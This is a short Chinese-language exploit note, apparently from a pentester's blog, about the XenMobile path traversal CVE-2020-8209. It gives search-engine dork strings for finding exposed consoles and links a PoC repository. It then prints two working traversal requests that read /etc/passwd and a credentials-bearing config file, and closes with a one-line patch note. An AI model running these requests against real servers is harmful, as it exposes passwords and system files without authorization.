---
title: XenMobile
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2020-12-13 14:50:45
top:
tags:
layout:
---
编写进度
- [x] 

  XenMobile MDM是一种可靠的移动设备管理解决方案，可以对企业设备和员工个人设备进行基于角色的管理和配置并确保安全性。完成用户设备注册后，IT部门可以自动为设备置备策略和应用，将应用列入黑名单或白名单，检测并防止使用越狱设备，擦除或有选择性地擦除丢失、被盗或不符合规定的设备中的数据。用户可以使用自己喜爱的任何设备，而IT部门可以确保企业资产的合规性，并有效保护设备中保存的企业内容。


## XenMobile目录穿越 CVE-2020-8209
CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件。

通过空间引擎关键字

"XenMobile控制台" 或者 "XenMobile - Console"

### POC

[CVE-2020-8209](https://github.com/B1anda0/CVE-2020-8209)
```zsh
/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd

/jsp/help-sb-download.jsp?sbFileName=../../../opt/sas/sw/config/sftu.properties
```

### 漏洞建议

官方补丁删除了/opt/sas/sw/tomcat/inst1/webapps/ROOT/jsp/help-sb-download.jsp




